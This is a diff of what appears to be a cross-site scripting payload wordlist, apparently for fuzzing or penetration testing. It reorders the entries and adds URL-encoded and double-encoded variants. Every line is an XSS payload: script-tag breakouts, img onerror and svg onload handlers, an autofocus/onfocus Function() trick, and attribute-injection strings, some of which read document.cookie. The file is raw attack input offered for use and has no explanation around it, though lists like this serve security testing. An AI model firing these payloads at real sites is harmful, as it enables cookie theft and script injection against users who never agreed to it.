@@ -1,15 +1,31 @@
-1234<img+src+onerror%3d'alert(1)'>
-%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
-FA_CERT%27%20onmouseover=alert(1)%20%27%22&
-%22%3E%3Cimage/src=%22//
---><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
-<script>alert(document.cookie)</script>
 "'><img src=x onerror=alert(1)>
-ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E
-</script><svg/onload=alert()>
-Test <img src=x onerror=alert(2)>
 "></script><script>alert(document.cookie)</script>
-</script><script>akert(1)</script>
+"><image/src="//
 #'><img src=x onerror=alert(document.domain)>
+%22%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document%2Ecookie%29%3C%2Fscript%3E
+%22%3E%3Cimage/src=%22//
+%23%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document%2Edomain%29%3E
+%2522%253E%253Cimage%2Fsrc%3D%2522%2F%2F
+%2527%253E%253Cscript%253Ealert%28document%2Edomain%29%253C%2Fscript%253E
 %27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+%2D%2D%3E%3Cbutton%2Fautofocus%2Fonfocus%3DFunction%28%22confirm%601%60%22%29%28%29%3B%2F%2Fname%3D%22XSS
+%3C%2Fscript%3E%3Cscript%3Eakert%281%29%3C%2Fscript%3E
+%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%29%3E
+%3Cscript%3Ealert%28document%2Ecookie%29%3C%2Fscript%3E
+'><script>alert(document.domain)</script>
 --><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
+1234%3Cimg%2Bsrc%2Bonerror%253d%27alert%281%29%27%3E
+1234<img src onerror='alert(1)'>
+1234<img+src+onerror%3d'alert(1)'>
+</script><script>akert(1)</script>
+</script><svg/onload=alert()>
+<script>alert(document.cookie)</script>
+FA%5FCERT%2527%2520onmouseover%3Dalert%281%29%2520%2527%2522%26
+FA_CERT%27%20onmouseover=alert(1)%20%27%22&
+FA_CERT' onmouseover=alert(1) '"&
+Test <img src=x onerror=alert(2)>
+Test%20%3Cimg%20src%3Dx%20onerror%3Dalert%282%29%3E
+ayn%253C%2Fscript%253E%253Csvg%2Fonload%3Dalert%28document%252edomain%29%253E
+ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E
+ayn</script><svg/onload=alert(document.domain)>
